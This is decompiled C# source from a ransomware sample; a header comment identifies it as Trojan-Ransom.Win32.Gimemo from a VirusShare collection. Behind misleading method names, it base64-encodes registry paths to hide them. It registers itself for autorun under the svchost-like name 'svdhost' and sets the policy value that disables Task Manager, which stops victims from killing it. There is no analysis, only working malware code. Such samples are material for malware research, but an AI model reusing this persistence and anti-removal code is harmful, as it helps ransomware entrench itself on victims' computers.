// Decompiled with JetBrains decompiler
// Type: MULTITAPPROCESSORLIB.multitapADD
// Assembly: act, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 510ABF47-1EBE-4DE2-8CB3-89824D0171A6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Gimemo.bgjr-0a80747158a8071accf734f8c78fde4c0e79168e2c2173fe40be82663317e20e.exe

using Microsoft.Win32;
using System;
using System.Text;
using System.Windows.Forms;

namespace MULTITAPPROCESSORLIB
{
  internal class multitapADD
  {
    private const string name = "svdhost";
    private string processname = "TaskMgr";

    public bool TAPVerifier(int grade) => grade < DateTime.Now.Year && grade > DateTime.Now.Second;

    public string base64Decode(string data)
    {
      try
      {
        Decoder decoder = new UTF8Encoding().GetDecoder();
        byte[] bytes = Convert.FromBase64String(data);
        char[] chars = new char[decoder.GetCharCount(bytes, 0, bytes.Length)];
        decoder.GetChars(bytes, 0, bytes.Length, chars, 0);
        return new string(chars);
      }
      catch (Exception ex)
      {
        throw new Exception("Error in base64Decode" + ex.Message);
      }
    }

    public bool SETTAPDELAYVALUE(bool autorun)
    {
      string executablePath = Application.ExecutablePath;
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey(this.base64Decode("U29mdHdhcmVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1blxc"));
      try
      {
        if (autorun)
          subKey.SetValue("svdhost", (object) executablePath);
        else
          subKey.DeleteValue("svdhost");
        subKey.Close();
      }
      catch
      {
        return false;
      }
      return true;
    }

    public bool checkSpotOS(string osmane) => osmane == "win";

    public void setmagicrun(string spotrunnerpath, string paternname)
    {
      try
      {
        if (!this.checkSpotOS("win"))
          return;
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(spotrunnerpath + this.base64Decode("bmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxQb2xpY2llc1xcU3lzdGVt"));
        subKey.SetValue(paternname + this.processname, (object) 1);
        subKey.Close();
      }
      catch
      {
      }
    }
  }
}
